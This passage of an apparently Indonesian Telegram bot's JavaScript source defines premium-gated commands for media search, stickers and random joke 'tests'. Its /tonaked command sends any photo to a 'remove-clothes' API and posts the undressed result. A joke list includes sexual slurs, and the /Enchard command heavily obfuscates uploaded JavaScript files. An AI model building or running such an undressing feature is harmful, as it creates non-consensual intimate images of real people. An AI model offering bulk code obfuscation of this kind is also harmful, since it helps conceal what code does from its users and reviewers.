const chatId = msg.chat.id;
const senderId = msg.from.id;
const userId = msg.from.id;
const isPremium = await premium (senderId);
const chatType = msg.chat.type;
            
   if (isGroupOnly() && chatType === 'private') {
   return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/pinterest')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest poto gelap");
    }

    const query = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
        }

        // Ambil gambar pertama dari hasil
        const firstResult = data.result[0];

        await bot.sendPhoto(chatId, firstResult, {
            caption: `📌 Pinterest Result for: *${query}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Pinterest API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
    }
});

bot.onText(/^\/tonaked(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = msg.text.split(' ').slice(1).join(' ');
  let imageUrl = args || null;
const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/tonaked')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  // Kalau reply ke foto
  if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const fileLink = await bot.getFileLink(fileId);
    imageUrl = fileLink;
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, '🪧 ☇ Format: /tonaked (reply gambar)');
  }

  const statusMsg = await bot.sendMessage(chatId, '⏳ ☇ Memproses gambar...');
  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return bot.editMessageText('❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    await bot.deleteMessage(chatId, statusMsg.message_id);
    await bot.sendPhoto(chatId, hasil);

  } catch (e) {
    console.error(e);
    await bot.editMessageText('❌ ☇ Terjadi kesalahan saat memproses gambar', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});


bot.onText(/^\/nulis(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
 const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/nulis')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  const text = match[1];
  if (!text) {
    return bot.sendMessage(chatId, "Mau nulis apa? Contoh:\n/nulis aku sayang kamu");
  }

  try {
    const progressMessage = await bot.sendMessage(chatId, "⌛ Sedang menulis...\n[░░░░░]");

    
    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "32",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

  
    await bot.sendPhoto(chatId, Buffer.from(response.data));
  } catch (error) {
    console.error("Nulis error:", error.message);
    bot.sendMessage(chatId, "❌ Error, coba lagi nanti ya.");
  }
});

bot.onText(/^\/ping$/, async (msg) => {
  const chatId = msg.chat.id;

  const start = Date.now(); // waktu awal
  const sentMsg = await bot.sendMessage(chatId, "🏓 Pong...");
  const end = Date.now(); // waktu akhir

  const ping = end - start;
const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/ping')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  

  bot.editMessageText(
    `🏓 *Pong!*  
📶 Kecepatan respon: *${ping} ms*`,
    {
      chat_id: chatId,
      message_id: sentMsg.message_id,
      parse_mode: "Markdown",
    }
  );
});

const aktivitas = {
  pagi: [
    "Lagi nyari sarapan tapi dapurnya kosong 🍞",
    "Baru bangun, masih loading... ☕",
    "Lagi olahraga jempol scroll TikTok 🏋️‍♂️",
    "Lagi ngopi sambil liatin grup kelas 🧃",
    "Lagi cari motivasi hidup di Instagram ✨",
    "Lagi dengerin suara ayam tetangga berantem 🐓",
    "Lagi nonton matahari terbit tapi di wallpaper 🌄",
    "Lagi ngelamun di kamar mandi 🚿",
    "Lagi cari sendal sebelah yang hilang 🩴",
    "Lagi mikir kenapa hari Senin datangnya cepat 😩"
  ],
  siang: [
    "Lagi pura-pura kerja padahal baca komik 💼",
    "Lagi ngelamun di depan nasi padang 🍛",
    "Lagi ngadem di bawah AC kantor orang 😎",
    "Lagi dengerin dosen tapi mikirin liburan 📚",
    "Lagi rebutan colokan di kafe ☕🔌",
    "Lagi debat sama temen soal makan siang 🍜",
    "Lagi scroll Shopee padahal lagi bokek 🛒",
    "Lagi cari sinyal buat buka tugas 📶",
    "Lagi nyari alasan buat skip kelas 🙃",
    "Lagi ngintip jam, nunggu waktu pulang 🕒"
  ],
  sore: [
    "Lagi main bola pake sandal jepit ⚽",
    "Lagi liat langit biar kelihatan deep 🌇",
    "Lagi nyemil tahu bulat dadakan 🚚",
    "Lagi ngopi senja biar aesthetic ☕",
    "Lagi nungguin hujan turun tapi malah panas 🌤️",
    "Lagi jalan-jalan cari wifi gratis 🚶‍♂️",
    "Lagi mikir mau ngelakuin apa malam ini 🤔",
    "Lagi bantu emak belanja ke warung 🛍️",
    "Lagi main sama kucing tetangga 🐱",
    "Lagi galau liat story mantan 😔"
  ],
  malam: [
    "Lagi nonton anime sampe lupa tugas 📺",
    "Lagi galau dengerin lagu lawas 🎧",
    "Lagi curhat ke AI karena manusia nggak ngerti 🤖",
    "Lagi merenungi hidup sambil rebahan 😔",
    "Lagi nyalain lampu tumblr biar estetik 🌃",
    "Lagi ngetik chat panjang tapi nggak dikirim 💬",
    "Lagi nungguin pesan yang nggak bakal datang 📭",
    "Lagi nge-stalk akun orang random di medsos 🕵️‍♀️",
    "Lagi ngedit story padahal nggak jadi upload 📸",
    "Lagi begadang tapi nggak tau buat apa 🌙"
  ]
};

function getWaktu() {
  const jam = new Date().getHours();
  if (jam >= 4 && jam < 11) return 'pagi';
  if (jam >= 11 && jam < 15) return 'siang';
  if (jam >= 15 && jam < 18) return 'sore';
  return 'malam';
}

function getRandomAktivitas() {
  const waktu = getWaktu();
  const daftar = aktivitas[waktu];
  const acak = daftar[Math.floor(Math.random() * daftar.length)];
  return { waktu, teks: acak };
}

bot.onText(/\/ceksedangapa/, async (msg) => {
  const chatId = msg.chat.id;
  const nama = msg.from.first_name || 'Kamu';
  const { waktu, teks } = getRandomAktivitas();
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
   if (isGroupOnly() && chatType === 'private') {
   return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/ceksedangapa')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  
  await bot.sendMessage(chatId,
    `🕒 *Waktu:* ${waktu.charAt(0).toUpperCase() + waktu.slice(1)}\n` +
    `🧐 ${nama} sedang apa?\n\n${teks}`, {
    parse_mode: 'Markdown'
  });
});


bot.onText(/^\/tts(?:\s+)?(.+)?/i, async (msg, match) => {
  const chatId = msg.chat.id
  const query = (match && match[1] || "").trim()
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/tts')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  if (!query) {
    bot.sendMessage(chatId, "Usage: /tts <keyword>")
    return
  }
  try {
    // Ganti URL API dengan https://faa-jian.my.id/search/tiktok
    const { data } = await axios.get("https://faa-jian.my.id/search/tiktok", { params: { q: query } })
    if (!data || !data.result || data.result.length === 0) {
      bot.sendMessage(chatId, "❌ Video tidak ditemukan.")
      return
    }

    const vid = data.result[0]
    const caption = `
🎬 *TikTok Video*
\\
Judul   : ${vid.title || "-"}
Durasi  : ${vid.duration || "-"} detik
Views   : ${vid.play_count || "-"}
Likes   : ${vid.digg_count || "-"}
Komentar: ${vid.comment_count || "-"}
Share   : ${vid.share_count || "-"}
Uploader: ${vid.author?.nickname || "-"} (${vid.author?.unique_id || "-"})
\\\``

    bot.sendVideo(chatId, vid.play, {
      caption: caption,
      parse_mode: "Markdown"
    })
  } catch (e) {
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil video TikTok.")
  }
});
bot.onText(/\/sticker/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/sticker')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //cek prem//
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  await bot.sendMessage(chatId, "📸 Kirimkan foto atau gambar yang ingin dijadikan stiker!");

  bot.once('photo', async (photoMsg) => {
    try {
      const fileId = photoMsg.photo[photoMsg.photo.length - 1].file_id;
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const filePath = `sticker_${chatId}.jpg`;

      fs.writeFileSync(filePath, response.data);
      await bot.sendSticker(chatId, filePath);
      fs.unlinkSync(filePath);
    } catch (err) {
      await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat stiker.");
    }
  });
});
bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const isPremium = await premium (senderId);
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/brat')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //cek prem//
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});




const LANGUAGES = {
  en: "🇬🇧 English",
  id: "🇮🇩 Indonesia",
  ar: "🇸🇦 Arabic",
  es: "🇪🇸 Spanish",
  fr: "🇫🇷 French",
  de: "🇩🇪 German",
  ja: "🇯🇵 Japanese",
  ru: "🇷🇺 Russian",
  zh: "🇨🇳 Chinese"
};


// Fungsi komentar berdasarkan nilai
function komentarTampan(nilai) {
  if (nilai >= 100) return "💎 Ganteng dewa, mustahil diciptakan ulang.";
  if (nilai >= 94) return "🔥 Ganteng gila! Mirip artis Korea!";
  if (nilai >= 90) return "😎 Bintang iklan skincare!";
  if (nilai >= 83) return "✨ Wajahmu memantulkan sinar kebahagiaan.";
  if (nilai >= 78) return "🧼 Bersih dan rapih, cocok jadi influencer!";
  if (nilai >= 73) return "🆒 Ganteng natural, no filter!";
  if (nilai >= 68) return "😉 Banyak yang naksir nih kayaknya.";
  if (nilai >= 54) return "🙂 Lumayan sih... asal jangan senyum terus.";
  if (nilai >= 50) return "😐 Gantengnya malu-malu.";
  if (nilai >= 45) return "😬 Masih bisa lah asal percaya diri.";
  if (nilai >= 35) return "🤔 Hmm... mungkin bukan harinya.";
  if (nilai >= 30) return "🫥 Sedikit upgrade skincare boleh tuh.";
  if (nilai >= 20) return "🫣 Coba pose dari sudut lain?";
  if (nilai >= 10) return "😭 Yang penting akhlaknya ya...";
  return "😵 Gagal di wajah, semoga menang di hati.";
}

function komentarCantik(nilai) {
  if (nilai >= 100) return "👑 Cantiknya level dewi Olympus!";
  if (nilai >= 94) return "🌟 Glowing parah! Bikin semua iri!";
  if (nilai >= 90) return "💃 Jalan aja kayak jalan di runway!";
  if (nilai >= 83) return "✨ Inner & outer beauty combo!";
  if (nilai >= 78) return "💅 Cantik ala aesthetic tiktok!";
  if (nilai >= 73) return "😊 Manis dan mempesona!";
  if (nilai >= 68) return "😍 Bisa jadi idol nih!";
  if (nilai >= 54) return "😌 Cantik-cantik adem.";
  if (nilai >= 50) return "😐 Masih oke, tapi bisa lebih wow.";
  if (nilai >= 45) return "😬 Coba lighting lebih terang deh.";
  if (nilai >= 35) return "🤔 Unik sih... kayak seni modern.";
  if (nilai >= 30) return "🫥 Banyak yang lebih butuh makeup.";
  if (nilai >= 20) return "🫣 Mungkin inner beauty aja ya.";
  if (nilai >= 10) return "😭 Cinta itu buta kok.";
  return "😵 Semoga kamu lucu pas bayi.";
}
function komentarSabar(nilai) {
  if (nilai >= 100) return "🌟 Wah, kamu luar biasa sabar dan hebat!";
  if (nilai >= 94) return "👍 Tetap sabar, kesuksesan sudah dekat.";
  if (nilai >= 90) return "😊 Sabar itu kunci, terus semangat ya!";
  if (nilai >= 83) return "💪 Kamu kuat, sabar sedikit lagi.";
  if (nilai >= 78) return "🌱 Sabar tumbuh jadi kekuatan.";
  if (nilai >= 73) return "✨ Jangan lelah bersabar, hasilnya manis.";
  if (nilai >= 68) return "🧘‍♂️ Tenang, sabar membawa kedamaian.";
  if (nilai >= 54) return "🌸 Sabar itu indah, teruslah berusaha.";
  if (nilai >= 50) return "🌈 Percaya deh, sabar ada hadiahnya.";
  if (nilai >= 45) return "☀️ Sabar sedikit lagi, kamu pasti bisa.";
  if (nilai >= 35) return "🌻 Jangan putus asa, sabar selalu membantu.";
  if (nilai >= 30) return "🕊️ Sabar itu pelajaran berharga.";
  if (nilai >= 20) return "🌿 Terus sabar ya, jangan menyerah.";
  if (nilai >= 10) return "🤲 Sedikit sabar, banyak berkah.";
  return "🙏 Sabar ya, setiap ujian ada hikmahnya.";
}

function komentarTolol(nilai) {
  if (nilai >= 100) return "🤪 Wah, level tololmu sudah master, salut!";
  if (nilai >= 94) return "😂 Udah pinter, tapi masih suka kocak.";
  if (nilai >= 90) return "😜 Kreatif banget, tolol yang menghibur!";
  if (nilai >= 83) return "😅 Santai aja, semua orang kadang tolol.";
  if (nilai >= 78) return "😆 Lumayan kocak, jangan berubah ya.";
  if (nilai >= 73) return "😉 Tolol tapi charming, kombinasi keren.";
  if (nilai >= 68) return "😎 Asal jangan kebanyakan mikir, santuy.";
  if (nilai >= 54) return "🤭 Jangan sedih, tolol itu manusiawi.";
  if (nilai >= 50) return "🙂 Santuy, semua ada waktunya.";
  if (nilai >= 45) return "😬 Masih wajar kok, jangan dipikirin.";
  if (nilai >= 35) return "🤔 Kadang tolol itu bikin lucu, ya kan?";
  if (nilai >= 30) return "😴 Santai, jangan terlalu serius.";
  if (nilai >= 20) return "😐 Bisa jadi tolol pintar, coba terus.";
  if (nilai >= 10) return "🙃 Hidup terlalu singkat buat terlalu serius.";
  return "😵 Wah, kamu jago banget jadi tolol, jangan berubah!";
}

function komentarMati(nilai) {
  if (nilai >= 100) return "💀 1 tahun lagi, kamu bakal jadi legenda!";
  if (nilai >= 94) return "☠️ 5 tahun lagi, siap-siap jadi juara!";
  if (nilai >= 90) return "🪦 10 tahun lagi, perjalanan masih panjang.";
  if (nilai >= 83) return "😵 15 tahun lagi, jangan berhenti berusaha.";
  if (nilai >= 78) return "🦴 20 tahun lagi, kesabaranmu diuji.";
  if (nilai >= 73) return "⚰️ 25 tahun lagi, semangat terus ya!";
  if (nilai >= 68) return "🕯️ 30 tahun lagi, jangan patah semangat.";
  if (nilai >= 54) return "🪦 40 tahun lagi, masih banyak waktu buat berkarya.";
  if (nilai >= 50) return "💤 50 tahun lagi, tetap jaga kesehatan dan mimpi.";
  if (nilai >= 45) return "🛌 60 tahun lagi, santai tapi jangan malas.";
  if (nilai >= 35) return "🌫️ 70 tahun lagi, teruslah berjuang.";
  if (nilai >= 30) return "😶‍🌫️ 80 tahun lagi, perjalanan panjang menanti.";
  if (nilai >= 20) return "🌙 90 tahun lagi, semangat terus hidupnya!";
  if (nilai >= 10) return "🌑 100 tahun lagi, kamu bakal jadi legenda abadi.";
  return "🌌 Lebih dari 100 tahun lagi, perjalananmu baru mulai.";
}

bot.onText(/^\/ceksabar$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote>💕 HASIL TES KESABARAN
👤 Nama: ${msg.from.first_name}
📊 Nilai: ${nilai}%
🗣️ Komentar: ${komentarSabar(nilai)}
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
});

bot.onText(/^\/cektolol$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  

  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote>💕 HASIL TES KETOLOLAN
👤 Nama: ${msg.from.first_name}
📊 Nilai: ${nilai}%
🗣️ Komentar: ${komentarTolol(nilai)}
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
});

bot.onText(/^\/cekmati$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote>💕 HASIL TES KETOLOLAN
👤 Nama: ${msg.from.first_name}
📊 Nilai: ${nilai}%
🗣️ Komentar: ${komentarMati(nilai)}
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
});

// /cektampan
bot.onText(/^\/cektampan$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Ketampanan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarTampan(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// /cekcantik
bot.onText(/^\/cekcantik$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Kecantikan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarCantik(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Nilai dan komentar untuk kekayaan
function komentarKaya(nilai) {
  if (nilai >= 100) return "💎 Sultan auto endorse siapa aja.";
  if (nilai >= 90) return "🛥️ Jet pribadi parkir di halaman rumah.";
  if (nilai >= 80) return "🏰 Rumahnya bisa buat konser.";
  if (nilai >= 70) return "💼 Bos besar! Duit ngalir terus.";
  if (nilai >= 60) return "🤑 Kaya banget, no debat.";
  if (nilai >= 50) return "💸 Kaya, tapi masih waras.";
  if (nilai >= 40) return "💳 Lumayan lah, saldo aman.";
  if (nilai >= 30) return "🏦 Kayanya sih... dari tampang.";
  if (nilai >= 20) return "🤔 Cukup buat traktir kopi.";
  if (nilai >= 10) return "🫠 Kaya hati, bukan dompet.";
  return "🙃 Duitnya imajinasi aja kayaknya.";
}

// Nilai dan komentar untuk kemiskinan
function komentarMiskin(nilai) {
  if (nilai >= 100) return "💀 Miskin absolut, utang warisan.";
  if (nilai >= 90) return "🥹 Mau beli gorengan mikir 3x.";
  if (nilai >= 80) return "😩 Isi dompet: angin & harapan.";
  if (nilai >= 70) return "😭 Bayar parkir aja utang.";
  if (nilai >= 60) return "🫥 Pernah beli pulsa receh?";
  if (nilai >= 50) return "😬 Makan indomie aja dibagi dua.";
  if (nilai >= 40) return "😅 Listrik token 5 ribu doang.";
  if (nilai >= 30) return "😔 Sering nanya *gratis ga nih?*";
  if (nilai >= 20) return "🫣 Semoga dapet bansos.";
  if (nilai >= 10) return "🥲 Yang penting hidup.";
  return "😵 Gaji = 0, tagihan = tak terbatas.";
}

// /cekkaya
bot.onText(/^\/cekkaya$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
💵 *Tes Kekayaan*
👤 Nama: *${msg.from.first_name}*
💰 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarKaya(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// /cekmiskin
bot.onText(/^\/cekmiskin$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
📉 *Tes Kemiskinan*
👤 Nama: *${msg.from.first_name}*
📉 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarMiskin(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar berdasarkan skor
function komentarJanda(nilai) {
  if (nilai >= 100) return "🔥 Janda premium, banyak yang ngantri.";
  if (nilai >= 90) return "💋 Bekas tapi masih segel.";
  if (nilai >= 80) return "🛵 Banyak yang ngajak balikan.";
  if (nilai >= 70) return "🌶️ Janda beranak dua, laku keras.";
  if (nilai >= 60) return "🧕 Pernah disakiti, sekarang bersinar.";
  if (nilai >= 50) return "🪞 Masih suka upload status galau.";
  if (nilai >= 40) return "🧍‍♀️ Janda low-profile.";
  if (nilai >= 30) return "💔 Ditinggal pas lagi sayang-sayangnya.";
  if (nilai >= 20) return "🫥 Baru ditinggal, masih labil.";
  if (nilai >= 10) return "🥲 Janda lokal, perlu support moral.";
  return "🚫 Masih istri orang, bro.";
}

// /cekjanda
bot.onText(/^\/cekjanda$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // 0 - 100
  const teks = `
👠 *Tes Kejandaan*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarJanda(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar sesuai skor pacar
function komentarPacar(nilai) {
  if (nilai >= 95) return "💍 Sudah tunangan, tinggal nikah.";
  if (nilai >= 85) return "❤️ Pacaran sehat, udah 3 tahun lebih.";
  if (nilai >= 70) return "😍 Lagi anget-angetnya.";
  if (nilai >= 60) return "😘 Sering video call tiap malam.";
  if (nilai >= 50) return "🫶 Saling sayang, tapi LDR.";
  if (nilai >= 40) return "😶 Dibilang pacaran, belum tentu. Tapi dibilang nggak, juga iya.";
  if (nilai >= 30) return "😅 Masih PDKT, nunggu sinyal.";
  if (nilai >= 20) return "🥲 Sering ngechat, tapi dicuekin.";
  if (nilai >= 10) return "🫠 Naksir diam-diam.";
  return "❌ Jomblo murni, nggak ada harapan sementara ini.";
}

// Command
bot.onText(/^\/cekpacar$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // nilai 0-100
  const teks = `
💕 *Tes Kepacaran*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarPacar(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cekkhodam(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = (match[1] || '').trim();

  if (!nama) {
    return bot.sendMessage(chatId, 'ɴᴀᴍᴀɴʏᴀ ᴍᴀɴᴀ ᴀɴᴊᴇɴɢ🤓');
  }

  const khodamList = [
    'si ganteng',
    'si jelek',
    'anomali bt script',
    'kang hapus sumber',
    'maling pulpen', 
    'kak gem', 
    'suster ngesot', 
    'kang ngocok',
    'Anomali maklu',
    'orang gila',
    'anak rajin',
    'jadi lc', 
    'suka ngentot tiap hari', 
    'tukang caper',
    'anak cerdas',
    'lonte gurun',
    'dugong',
    'macan yatim',
    'buaya darat',
    'kanjut terbang',
    'kuda kayang',
    'janda salto',
    'lonte alas',
    'jembut singa',
    'gajah terbang',
    'kuda cacat',
    'jembut pink',
    'sabun bolong',
    'ambalambu',
    'megawati',
    'jokowi', 
    'polisi', 
    'sempak bolong', 
    'bh bolong',
  ];

  const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

  const hasil = `
<blockquote><b>𖤐 ʜᴀsɪʟ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ:</b>
╭───────────────────
├ •ɴᴀᴍᴀ : ${nama}
├ •ᴋʜᴏᴅᴀᴍɴʏᴀ : ${pickRandom(khodamList)}
├ •ɴɢᴇʀɪ ʙᴇᴛ ᴊɪʀ ᴋʜᴏᴅᴀᴍɴʏᴀ
╰───────────────────
<b>ɴᴇxᴛ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍɴʏᴀ sɪᴀᴘᴀ ʟᴀɢɪ.</b>
</blockquote>
  `;

  bot.sendMessage(chatId, hasil, { parse_mode: 'HTML' });
});

bot.onText(/\/Enchard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const randomImage = getRandomImage();
    const isPremium = await premium (senderId);    
    const chatType = msg.chat.type;
           
            
      if (isGroupOnly() && chatType === 'private') {
      return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/enchard')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


  //cekprem//
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama iif Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀DarkNight舀" + "肀DarkNight舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireIsBack舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
